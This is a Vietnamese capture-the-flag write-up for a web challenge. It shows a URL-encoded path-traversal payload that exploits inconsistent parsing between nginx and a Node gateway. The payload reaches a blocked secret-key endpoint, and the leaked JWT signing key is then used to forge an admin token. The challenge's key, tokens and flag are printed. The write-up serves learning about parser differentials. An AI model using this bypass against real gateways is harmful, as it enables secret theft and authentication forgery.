![image](https://github.com/caodchuong312/CTFs/assets/92881216/9f28dde2-0b74-4f54-8214-72146b675ba5)

Xuất hiện `Admin Flag` và nó thứ cần mua. Giờ signup và login.

Sau khi login nhận được `jwt` là `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImNodW9uZyIsIm5hbWUiOiJjaHVvbmciLCJpYXQiOjE2OTMxMTA3NTB9.RoQQLk5EYawd7cC94tjDKATpsoVYPQx9aGPTa4qoI3k`

![image](https://github.com/caodchuong312/CTFs/assets/92881216/5f3d2f92-6176-4755-be0b-c53ccf69d998)

Flag đã sold old và ta cần truy cập vào admin để lấy.

![image](https://github.com/caodchuong312/CTFs/assets/92881216/0cd13f19-a4dd-408e-98f8-439f13e8c94e)

Thử làm bài thứ cơ bản với nó như brute-force, thay đổi `alg`,... nhưng không khả thi.

Trong `api-nginx.conf`:

![image](https://github.com/caodchuong312/CTFs/assets/92881216/19d48cd8-078b-49e0-8a60-73c026c5a556)

Nó chặn path `/api/_`.

Trong `ms-secret/server.js`:

![image](https://github.com/caodchuong312/CTFs/assets/92881216/2d8a553c-be9b-445d-a0dd-9d701598a3bd)

Như vậy `/_secret/keys` chứa secret key để sign `jwt`. Ta cần lấy secret key đó tại `/api/_secret/keys` và tất nhiền là bị deny.

![image](https://github.com/caodchuong312/CTFs/assets/92881216/8519dd21-7650-467e-8964-297a6082a387)

Cách khai thác ở đây nhờ vào việc parse URL không nhất quán giữa `nginx` và `node`.

- Trong `api-nginx`, nginx chuẩn hóa path theo rules:

`/api/user/%2e%2e%2f_secret/keys%23%2f%2e%2e%2f%2e%2e` => `/api/user/../_secret/keys#/../..` => `/api`

- Trong gateway matching, `node` không decode `%2f` (`/`):

`/api/user/%2e%2e%2f_secret/keys%23%2f%2e%2e%2f%2e%2e` => `/api/user/..%2f_secret/keys%23%2f..%2f..`

- Ở gateway các ký tự encode URL sẽ được decode:

`/api/user/..%2f_secret/keys%23%2f..%2f..` => 	`/api/user/../_secret/keys#/../..` => 	`/user/../_secret/keys#/../..`

- `#` bỏ qua phần sau và nginx sẽ match với api: `/_secret/keys`.

payload: `/api/user/%2e%2e%2f_secret/keys%23%2f%2e%2e%2f%2e%2e`

![image](https://github.com/caodchuong312/CTFs/assets/92881216/942f0cd6-ce81-4dd1-a622-81c75dc84a53)

dùng `ASDZFHL.KWLJFYPOJWEPMP3OMXPfJCVJKLWEJL_2` để đổi `id` sang `admin` và mua flag:

![image](https://github.com/caodchuong312/CTFs/assets/92881216/2cf9a362-aabb-48e9-9180-f9e0c3acf992)

`jwt`` mới `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImFkbWluIiwibmFtZSI6ImNodW9uZyIsImlhdCI6MTY5MzExMDc1MH0.6j_x7GSLj5teXHzCJI0xjbmRNkutiAQBJZqgeChq8tg`

![image](https://github.com/caodchuong312/CTFs/assets/92881216/f3f0fb72-89e7-47c2-8d98-9c3871f8a119)

>flag `sctf{InC0nSistenCy&vu1nerlable_syntax_make_it_vulnerable}`
